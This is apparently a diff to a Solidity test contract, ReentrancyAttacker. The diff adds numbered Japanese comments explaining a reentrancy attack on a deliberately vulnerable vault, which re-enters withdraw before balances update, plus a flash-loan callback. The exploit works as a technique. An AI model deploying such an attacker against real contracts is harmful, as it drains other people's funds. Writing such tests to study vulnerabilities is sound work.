@@ -23,30 +23,40 @@ contract ReentrancyAttacker {
     constructor(address _vault, address _token) {
         // テストから渡された Vault と ERC20 のアドレスを保存する。
         // owner はこの攻撃用コントラクトをデプロイしたテストコントラクトになる。
+        // 1. Vault のアドレスを保存する。
         vault = VulnerableVault(_vault);
+        // 2. ERC20 のアドレスを保存する。
         token = IERC20(_token);
+        // 3. デプロイしたテストコントラクトを owner として保存する。
         owner = msg.sender;
     }
 
     function prepare() external {
         // Vault.deposit は token.transferFrom を使うため、先に allowance を設定する。
         // approve の第2引数が、Vault に使わせる最大数量。
+        // 1. Vault に depositAmount 分の使用許可を与える。
         token.approve(address(vault), depositAmount);
     }
 
     function attack() external {
         // 実行順序は count 初期化 -> deposit -> withdraw。
         // withdraw 中に Vault が onVaultWithdraw を呼ぶと、このコントラクトへ処理が戻る。
+        // 1. 再入回数を0へ戻す。
         count = 0;
+        // 2. 攻撃開始イベントを記録する。
         emit AttackStarted(depositAmount, maxReentries);
+        // 3. Vault へトークンを預ける。
         vault.deposit(depositAmount);
+        // 4. 出金を開始し、Vault の callback を発生させる。
         vault.withdraw(depositAmount);
     }
 
     function attackFlashLoan(bytes calldata data) external {
         // Vault から見ると receiver は address(this)。
         // そのため、借入後に Vault が onFlashLoan を呼び出す。
+        // 1. フラッシュローン開始イベントを記録する。
         emit FlashLoanStarted(depositAmount);
+        // 2. 自分自身を receiver としてフラッシュローンを開始する。
         vault.flashLoan(address(this), depositAmount, data);
     }
 
@@ -56,15 +66,20 @@ contract ReentrancyAttacker {
         require(msg.sender == address(vault), "only vault callback");
         if (count < maxReentries) {
             // VulnerableVault がまだ balances を減らしていないタイミングで再度 withdraw する。
+            // 1. 再入回数を1増やす。
             count += 1;
+            // 2. 再入発生イベントを記録する。
             emit ReentryTriggered(count);
+            // 3. 残高更新前の Vault へ再び withdraw を呼ぶ。
             vault.withdraw(depositAmount);
         }
     }
 
     function onFlashLoan(address, uint256 amount, uint256 fee, bytes calldata) external {
         // flashLoan の callback では、借りた元本と手数料をまとめて返す。
+        // 1. callback の呼び出し元が Vault か確認する。
         require(msg.sender == address(vault), "only vault callback");
+        // 2. 元本と手数料を Vault へ返す。
         require(token.transfer(address(vault), amount + fee), "loan repayment failed");
     }
 
